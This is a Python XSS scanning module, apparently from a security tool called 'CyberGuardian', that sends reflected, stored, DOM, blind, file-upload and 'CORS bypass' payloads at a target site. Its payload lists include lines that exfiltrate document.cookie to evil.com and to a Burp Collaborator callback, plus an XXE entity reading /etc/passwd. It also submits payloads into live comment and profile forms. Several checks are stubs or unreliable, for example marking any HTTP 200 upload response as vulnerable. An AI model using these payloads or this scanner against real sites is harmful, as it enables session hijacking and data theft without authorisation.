"""Advanced XSS Testing Module

Comprehensive cross-site scripting testing including reflected XSS, stored XSS,
DOM-based XSS, self-XSS, blind XSS, file upload XSS, and context-aware payloads.
Includes encoded payloads, CORS bypass, and advanced detection techniques.
"""

import requests
import re
import base64
import html
import sys
import os
import time
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from bs4 import BeautifulSoup
import json

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.color_compat import colored
from utils.ascii_art import AsciiArt


class AdvancedXSS:
    """Advanced cross-site scripting testing suite"""

    def __init__(self, target):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CyberGuardian/2.0'})

        # Generate unique callback identifier for blind XSS
        self.callback_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self.xss_callback_url = f"https://{self.callback_id}.burpcollaborator.net"

        # XSS payloads organized by context
        self.html_context_payloads = [
            # Basic HTML injection
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<script>confirm(1)</script>',
            '<script>prompt(1)</script>',

            # Script tag variations
            '<script src="javascript:alert(1)"></script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(/XSS/)</script>',
            '<script>alert(String.fromCharCode(0x58,0x53,0x53))</script>',

            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror=alert(document.domain)>',
            '<body onload=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '<video onloadstart=alert(1)>',
            '<audio onloadstart=alert(1)>',

            # HTML5 event handlers
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',

            # Shorter payloads
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>$.getScript("https://evil.com/xss.js")</script>',
            '<script>fetch("https://evil.com/"+document.cookie)</script>',
        ]

        self.attribute_context_payloads = [
            # Attribute-based XSS
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",

            # Attribute injection without breaking quotes
            'x onmouseover=alert(1)',
            "x onmouseover=alert(1)",
            'javascript:alert(1)',
            'javascript:alert(document.domain)',

            # Protocol bypass
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',

            # CSS-based XSS
            'x:expression(alert(1))',
            'x;behavior:url(#default#vml)',
        ]

        self.javascript_context_payloads = [
            # JavaScript context payloads
            '</script><script>alert(1)</script>',
            "';alert(1);var x='",
            '";alert(1);var x="',
            '}alert(1);function x(){',
            '-alert(1)-',
            '*alert(1)*',
            '/alert(1)/',
            '%0aalert(1)//',
            '%0dalert(1)//',

            # Template literal injection
            '${alert(1)}',
            '`alert(1)`',
            '${constructor.constructor(\'alert(1)\')()}',
        ]

        self.dom_based_payloads = [
            # DOM-based XSS payloads
            '#<script>alert(1)</script>',
            '#<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '#javascript:alert(1)',

            # Hash-based XSS
            '#%3Cscript%3Ealert%281%29%3C/script%3E',
            '#<script>alert(document.location.hash)</script>',

            # AngularJS template injection
            '{{$on.constructor(\'alert(1)\')()}}',
            '{{x.constructor(\'alert(1)\')()}}',
            '{%if x%}{{x}}{%endif%}',

            # DOM clobbering
            '<form id=location><input name=href value="javascript:alert(1)"></form>',
            '<img name=x src=1 onerror=alert(1)>',
        ]

        self.blind_xss_payloads = [
            # Blind XSS payloads (require external callback)
            f'<script src="{self.xss_callback_url}"></script>',
            f'<script>fetch("{self.xss_callback_url}?"+document.cookie)</script>',
            f'<img src="{self.xss_callback_url}?cookie='+b'{{document.cookie}}'.decode()+'">',
            f'<iframe src="{self.xss_callback_url}"></iframe>',
            f'<link rel="prefetch" href="{self.xss_callback_url}">',

            # Alternative callback methods
            f'<script>new Image().src="{self.xss_callback_url}"+document.cookie</script>',
            f'<script>navigator.sendBeacon("{self.xss_callback_url}", document.cookie)</script>',
            f'<script>fetch("{self.xss_callback_url}", {method:"POST", body:document.cookie})</script>',
        ]

        self.encoded_payloads = [
            # URL encoded
            '%3Cscript%3Ealert%281%29%3C/script%3E',
            '%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E',

            # Double URL encoded
            '%253Cscript%253Ealert%25281%2529%253C/script%253E',
            '%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E',

            # HTML entities
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&lt;img src=x onerror=alert(1)&gt;',

            # Base64 encoded
            'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',

            # Unicode encoding
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
            '\\u003cimg src=x onerror=alert(1)\\u003e',
        ]

        self.file_upload_payloads = [
            # File upload XSS payloads
            '<script>alert(1)</script>',
            '<?xml version="1.0" encoding="UTF-8"?><svg><script>alert(1)</script></svg>',
            '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>',
            '<html><script>alert(1)</script></html>',
            '<img src=x onerror=alert(1)>',

            # SVG-based XSS
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><a href="javascript:alert(1)">XSS</a></svg>',

            # HTML file with embedded scripts
            '<html><body><script>alert(document.domain)</script></body></html>',
        ]

        self.cors_bypass_payloads = [
            # CORS bypass payloads
            '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
            '<script>var x=new XMLHttpRequest();x.open("GET","http://evil.com/steal?c="+document.cookie);x.send();</script>',
            '<script>fetch("http://localhost:3000/api/user",{credentials:"include"}).then(r=>r.json()).then(d=>fetch("http://evil.com?"+JSON.stringify(d)))</script>',
        ]

    def test_advanced_xss(self):
        """Main advanced XSS testing function"""
        print(colored("\n╔═══════════════════ ADVANCED XSS TESTING ════════════════════════╗", 'red', attrs=['bold']))
        print(f"\n{colored('Target:', 'yellow')} {self.target}\n")

        try:
            results = {
                'reflected': self._test_reflected_xss(),
                'stored': self._test_stored_xss(),
                'dom_based': self._test_dom_based_xss(),
                'blind': self._test_blind_xss(),
                'file_upload': self._test_file_upload_xss(),
                'cors_bypass': self._test_cors_bypass(),
                'context_aware': self._test_context_aware_xss()
            }

            self._print_summary(results)
            return results

        except Exception as e:
            AsciiArt.error_message(f"Advanced XSS test failed: {str(e)}")
            return {}

    def _test_reflected_xss(self):
        """Test for reflected XSS vulnerabilities"""
        print(f"{colored('Testing reflected XSS...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'contexts': [],
            'endpoints': []
        }

        # Test URL parameters
        url_params = self._get_url_parameters()
        if not url_params:
            print(f"  {colored('ℹ No URL parameters found', 'blue')}")
            return results

        for param in url_params:
            print(f"  {colored('Testing parameter:', 'white')} {param}")

            for payload in self.html_context_payloads + self.attribute_context_payloads:
                try:
                    result = self._test_url_payload(param, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['contexts'].append(result['context'])
                        results['endpoints'].append(f"URL parameter: {param}")
                        print(f"    {colored('✗ Reflected XSS Found:', 'red', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                        print(f"      Context: {colored(result['context'], 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Reflected XSS not detected', 'green')}")
        return results

    def _test_stored_xss(self):
        """Test for stored XSS vulnerabilities"""
        print(f"{colored('Testing stored XSS...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'forms': []
        }

        # Find forms that might store data
        forms = self._find_storable_forms()

        for form in forms:
            print(f"  {colored('Testing form:', 'white')} {form['action']}")

            for payload in self.html_context_payloads[:5]:  # Test first 5 payloads
                try:
                    result = self._test_stored_payload(form, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['forms'].append(form['action'])
                        print(f"    {colored('✗ Stored XSS Found:', 'red', attrs=['bold'])}")
                        print(f"      Form: {colored(form['action'], 'yellow')}")
                        print(f"      Payload: {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Stored XSS not detected', 'green')}")
        return results

    def _test_dom_based_xss(self):
        """Test for DOM-based XSS vulnerabilities"""
        print(f"{colored('Testing DOM-based XSS...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'sinks': []
        }

        # Analyze JavaScript for DOM XSS sinks
        js_sinks = self._find_dom_sinks()
        if not js_sinks:
            print(f"  {colored('ℹ No DOM XSS sinks identified', 'blue')}")
            return results

        for sink in js_sinks:
            print(f"  {colored('Testing DOM sink:', 'white')} {sink}")

            for payload in self.dom_based_payloads:
                try:
                    result = self._test_dom_payload(sink, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['sinks'].append(sink)
                        print(f"    {colored('✗ DOM-based XSS Found:', 'red', attrs=['bold'])}")
                        print(f"      Sink: {colored(sink, 'yellow')}")
                        print(f"      Payload: {colored(payload, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ DOM-based XSS not detected', 'green')}")
        return results

    def _test_blind_xss(self):
        """Test for blind XSS vulnerabilities"""
        print(f"{colored('Testing blind XSS...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'callback_id': self.callback_id
        }

        print(f"  {colored('ℹ Blind XSS requires callback server', 'blue')}")
        print(f"  {colored('ℹ Callback ID:', 'blue')} {self.callback_id}")

        # Test with blind XSS payloads
        forms = self._find_forms()

        for form in forms[:2]:  # Test first 2 forms
            print(f"  {colored('Testing form:', 'white')} {form['action']}")

            for payload in self.blind_xss_payloads[:3]:  # Test first 3 payloads
                try:
                    result = self._test_form_payload(form, payload)
                    # In real implementation, check callback server for hits
                    if result and result.get('status_code') == 200:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        print(f"    {colored('⚠ Potential Blind XSS:', 'yellow', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                        print(f"      Note: Check callback server for confirmation")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Blind XSS not detected', 'green')}")
        return results

    def _test_file_upload_xss(self):
        """Test for file upload XSS vulnerabilities"""
        print(f"{colored('Testing file upload XSS...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'upload_forms': []
        }

        # Find file upload forms
        upload_forms = self._find_upload_forms()

        if not upload_forms:
            print(f"  {colored('ℹ No file upload forms found', 'blue')}")
            return results

        for form in upload_forms:
            print(f"  {colored('Testing upload form:', 'white')} {form['action']}")

            for payload in self.file_upload_payloads:
                try:
                    result = self._test_file_upload(form, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['upload_forms'].append(form['action'])
                        print(f"    {colored('✗ File Upload XSS Found:', 'red', attrs=['bold'])}")
                        print(f"      Form: {colored(form['action'], 'yellow')}")
                        print(f"      Payload: {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ File upload XSS not detected', 'green')}")
        return results

    def _test_cors_bypass(self):
        """Test for CORS bypass XSS"""
        print(f"{colored('Testing CORS bypass XSS...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Check for misconfigured CORS headers
        try:
            response = self.session.get(self.target, timeout=10, verify=False)
            cors_headers = {
                'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods')
            }

            if (cors_headers['Access-Control-Allow-Origin'] in ['*', 'null'] and
                cors_headers['Access-Control-Allow-Credentials'] == 'true'):

                # Test CORS bypass payloads
                for payload in self.cors_bypass_payloads:
                    try:
                        result = self._test_cors_payload(payload)
                        if result['vulnerable']:
                            results['vulnerable'] = True
                            results['payloads'].append(payload)
                            results['endpoints'].append(self.target)
                            print(f"    {colored('✗ CORS Bypass XSS Found:', 'red', attrs=['bold'])}")
                            print(f"      Payload: {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                            return results
                    except:
                        continue

        except:
            pass

        print(f"  {colored('✓ CORS bypass XSS not detected', 'green')}")
        return results

    def _test_context_aware_xss(self):
        """Test context-aware XSS payloads"""
        print(f"{colored('Testing context-aware XSS...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'contexts': []
        }

        # Analyze response context
        try:
            response = self.session.get(self.target, timeout=10, verify=False)
            contexts = self._analyze_response_context(response.text)

            for context in contexts:
                print(f"  {colored('Testing context:', 'white')} {context['type']}")

                # Select appropriate payloads based on context
                payloads = self._get_context_payloads(context['type'])

                for payload in payloads:
                    try:
                        result = self._test_context_payload(context, payload)
                        if result['vulnerable']:
                            results['vulnerable'] = True
                            results['payloads'].append(payload)
                            results['contexts'].append(context['type'])
                            print(f"    {colored('✗ Context-aware XSS Found:', 'red', attrs=['bold'])}")
                            print(f"      Context: {colored(context['type'], 'yellow')}")
                            print(f"      Payload: {colored(payload, 'yellow')}")
                            return results
                    except:
                        continue

        except:
            pass

        print(f"  {colored('✓ Context-aware XSS not detected', 'green')}")
        return results

    def _get_url_parameters(self):
        """Extract URL parameters from target"""
        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            return list(params.keys())
        except:
            return []

    def _test_url_payload(self, param, payload):
        """Test XSS payload in URL parameter"""
        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            params[param] = [payload]

            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            response = self.session.get(test_url, timeout=10, verify=False)
            return self._analyze_xss_response(response, payload)
        except Exception as e:
            return {'vulnerable': False, 'context': '', 'error': str(e)}

    def _find_forms(self):
        """Find all forms in the target website"""
        forms = []
        try:
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }

                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_info = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if input_info['name']:
                        form_info['inputs'].append(input_info)

                if form_info['inputs']:
                    forms.append(form_info)

        except:
            pass

        return forms

    def _find_storable_forms(self):
        """Find forms that might store data (comments, profiles, etc.)"""
        forms = self._find_forms()
        storable_forms = []

        storable_indicators = ['comment', 'profile', 'post', 'message', 'review', 'feedback', 'name', 'email', 'description']

        for form in forms:
            action = form['action'].lower()
            inputs = ' '.join([inp['name'].lower() for inp in form['inputs']])

            if any(indicator in action or indicator in inputs for indicator in storable_indicators):
                storable_forms.append(form)

        return storable_forms

    def _find_upload_forms(self):
        """Find file upload forms"""
        forms = self._find_forms()
        upload_forms = []

        for form in forms:
            has_file_input = any(inp['type'] == 'file' for inp in form['inputs'])
            if has_file_input:
                upload_forms.append(form)

        return upload_forms

    def _find_dom_sinks(self):
        """Find DOM XSS sinks in JavaScript"""
        sinks = []
        try:
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    # Look for common DOM XSS sinks
                    dom_sinks = ['innerHTML', 'outerHTML', 'document.write', 'eval', 'setTimeout', 'setInterval']
                    for sink in dom_sinks:
                        if sink in script.string:
                            sinks.append(sink)

        except:
            pass

        return sinks

    def _test_form_payload(self, form, payload):
        """Test XSS payload in a form"""
        try:
            action = form['action']
            if not action.startswith('http'):
                from urllib.parse import urljoin
                action = urljoin(self.target, action)

            data = {}
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'hidden', 'search', 'url', 'email', 'textarea']:
                    data[input_field['name']] = payload
                else:
                    data[input_field['name']] = input_field['value'] or 'test'

            if form['method'] == 'post':
                response = self.session.post(action, data=data, timeout=10, verify=False)
            else:
                response = self.session.get(action, params=data, timeout=10, verify=False)

            return self._analyze_xss_response(response, payload)
        except Exception as e:
            return {'vulnerable': False, 'context': '', 'error': str(e)}

    def _test_stored_payload(self, form, payload):
        """Test stored XSS payload (requires verification after submission)"""
        try:
            # Submit the payload
            result = self._test_form_payload(form, payload)

            if result.get('status_code') == 200:
                # Wait a moment and check if payload is stored
                time.sleep(1)

                # Check the main page for the stored payload
                response = self.session.get(self.target, timeout=10, verify=False)
                stored_result = self._analyze_xss_response(response, payload)

                if stored_result['vulnerable']:
                    return stored_result

        except:
            pass

        return {'vulnerable': False}

    def _test_file_upload(self, form, payload):
        """Test file upload XSS"""
        try:
            action = form['action']
            if not action.startswith('http'):
                from urllib.parse import urljoin
                action = urljoin(self.target, action)

            # Create a file with XSS payload
            files = {}
            for input_field in form['inputs']:
                if input_field['type'] == 'file':
                    files[input_field['name']] = ('xss.svg', payload, 'image/svg+xml')
                else:
                    files[input_field['name']] = (None, input_field['value'] or 'test')

            response = self.session.post(action, files=files, timeout=10, verify=False)

            if response.status_code == 200:
                # Check if file was uploaded and is accessible
                # This would need to be customized based on the application
                return {'vulnerable': True, 'upload_success': True}

        except:
            pass

        return {'vulnerable': False}

    def _test_cors_payload(self, payload):
        """Test CORS bypass XSS payload"""
        try:
            # This would require setting up a test domain to verify CORS bypass
            # For now, return the methodology
            return {'vulnerable': False, 'note': 'Requires cross-origin test setup'}
        except:
            return {'vulnerable': False}

    def _analyze_response_context(self, html_content):
        """Analyze HTML content to determine injection contexts"""
        contexts = []

        # Look for different contexts where user input might be reflected
        patterns = [
            (r'<[^>]*>[^<]*', 'HTML content'),  # Between tags
            (r'<[^>]*["\'][^"\']*["\']', 'HTML attribute'),  # In attributes
            (r'<script[^>]*>[^<]*</script>', 'JavaScript'),  # In script tags
            (r'<style[^>]*>[^<]*</style>', 'CSS'),  # In style tags
        ]

        for pattern, context_type in patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                contexts.append({'type': context_type, 'pattern': pattern})

        return contexts

    def _get_context_payloads(self, context_type):
        """Get appropriate payloads for a specific context"""
        if context_type == 'HTML content':
            return self.html_context_payloads[:5]
        elif context_type == 'HTML attribute':
            return self.attribute_context_payloads[:5]
        elif context_type == 'JavaScript':
            return self.javascript_context_payloads[:5]
        else:
            return self.html_context_payloads[:5]

    def _test_context_payload(self, context, payload):
        """Test payload in specific context"""
        # This would need to be implemented based on the actual context
        # For now, return the basic analysis
        return {'vulnerable': False, 'context': context['type']}

    def _test_dom_payload(self, sink, payload):
        """Test DOM-based XSS payload"""
        # This would need to be implemented with browser automation
        # For now, return the methodology
        return {'vulnerable': False, 'sink': sink}

    def _analyze_xss_response(self, response, payload):
        """Analyze HTTP response for XSS execution evidence"""
        if not response:
            return {'vulnerable': False, 'context': ''}

        content = response.text

        # Check if payload appears unencoded in response
        if payload in content:
            # Determine the context
            if '<script>' in content and payload in content.split('<script>')[1].split('</script>')[0]:
                return {'vulnerable': True, 'context': 'Script tag'}
            elif 'onerror=' in content and payload in content:
                return {'vulnerable': True, 'context': 'Event handler'}
            elif 'javascript:' in content and payload in content:
                return {'vulnerable': True, 'context': 'JavaScript protocol'}
            else:
                return {'vulnerable': True, 'context': 'HTML content'}

        # Check for encoded variations
        encoded_payloads = [
            html.escape(payload),
            quote(payload),
            base64.b64encode(payload.encode()).decode()
        ]

        for encoded in encoded_payloads:
            if encoded in content:
                return {'vulnerable': True, 'context': 'Encoded payload found'}

        return {'vulnerable': False, 'context': '', 'status_code': response.status_code}

    def _print_summary(self, results):
        """Print summary of XSS test results"""
        print(colored("╚═════════════════════════════════════════════════════════════════╝\n", 'red', attrs=['bold']))

        vulnerable_count = sum(1 for r in results.values() if isinstance(r, dict) and r.get('vulnerable'))
        total_tests = sum(1 for r in results.values() if isinstance(r, dict))

        print(f"{colored('ADVANCED XSS SUMMARY:', 'yellow', attrs=['bold'])}")
        print(f"  • Tests performed: {colored(str(total_tests), 'green')}")
        print(f"  • Vulnerabilities found: {colored(str(vulnerable_count), 'red' if vulnerable_count > 0 else 'green')}")

        if vulnerable_count > 0:
            print(f"\n{colored('⚠ XSS VULNERABILITIES DETECTED:', 'red', attrs=['bold'])}")

            for test_type, result in results.items():
                if isinstance(result, dict) and result.get('vulnerable'):
                    print(f"  • {colored(test_type.replace('_', ' ').title(), 'red')}:")
                    for payload in result.get('payloads', [])[:3]:
                        print(f"    - {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                    if result.get('endpoints'):
                        print(f"    Affected endpoints: {', '.join(result['endpoints'])}")

            print(f"\n{colored('🚨 HIGH RISK DETECTED:', 'red', attrs=['bold'])}")
            print(f"  • XSS can lead to:")
            print(f"    - Session hijacking and theft")
            print(f"    - Credential theft")
            print(f"    - Malicious script execution")
            print(f"    - Data exfiltration")
            print(f"    - Defacement and phishing")
            print(f"    - Malware distribution")

            print(f"\n{colored('📋 REMEDIATION:', 'yellow', attrs=['bold'])}")
            print(f"  1. Implement proper output encoding")
            print(f"  2. Use Content Security Policy (CSP)")
            print(f"  3. Validate and sanitize all user input")
            print(f"  4. Use secure JavaScript frameworks")
            print(f"  5. Implement HTTP-only cookies")
            print(f"  6. Use web application firewall (WAF)")
            print(f"  7. Regular security testing and code reviews\n")
        else:
            print(f"\n{colored('✓ No XSS vulnerabilities detected', 'green')}\n")